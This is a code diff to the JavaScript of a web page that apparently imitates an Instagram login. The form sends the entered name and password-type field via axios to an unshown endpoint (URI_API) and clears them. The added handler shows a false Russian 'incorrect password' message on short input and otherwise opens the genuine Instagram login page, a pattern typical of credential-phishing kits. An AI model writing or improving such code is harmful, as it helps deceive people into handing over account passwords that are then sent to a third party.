@@ -5,6 +5,20 @@ const success = document.getElementById("success")
 const nameInput = document.getElementById('name')
 const emailInput = document.getElementById('email')
 const icon = document.querySelector(".icon ion-icon")
+const btn = document.getElementById('submitButton')
+
+console.log(emailInput);
+btn.addEventListener('click', () => {
+  if (emailInput.value.length < 8 || nameInput.value.length < 1) {
+    success.innerHTML = "Вы ввели неверный пароль. Проверьте пароль и попробуйте ещё раз";
+  } else {
+
+    console.log("next");
+  window.open('https://www.instagram.com/accounts/login/')
+
+}
+
+});
 
 console.log(icon);
 icon.addEventListener('click', () => {
@@ -14,15 +28,7 @@ icon.addEventListener('click', () => {
         emailInput.type = "password";
         }    
 })
-document.getElementById('submitButton').addEventListener('click', function() {
-    // if(emailInput.value.length >= 8 ){
-    //        alert('hello')
-    //    } else if(emailInput.value.length < 8){
-    //        alert('err')
-    //    }
 
-    open('https://www.instagram.com/', );
-});
 
 document.getElementById('tg').addEventListener('submit', function(e){
     e.preventDefault()
@@ -40,20 +46,13 @@ axios.post(URI_API, {
     this.name.value = "";
     this.email.value = "";
     console.log(nameInput.value);
-   
+  
+    
     
     // console.log(nameInput.value);
     // console.log(emailInput.value);
-    // if (nameInput.value !== "" || emailInput.value !== "") {
-    //     nameInput.value.preventDefault()
-    //     success.innerHTML = "Сообщение не отправлено!";
-    //     console.log("err");
-    // } else {
-    //     success.innerHTML = "Сообщение отправлено!";
-    //     console.log("next");
-
-    // }
-    // success.style.display = "block"
+   
+    success.style.display = "block"
     // success.style.marginBottom = "20px"
 
 })
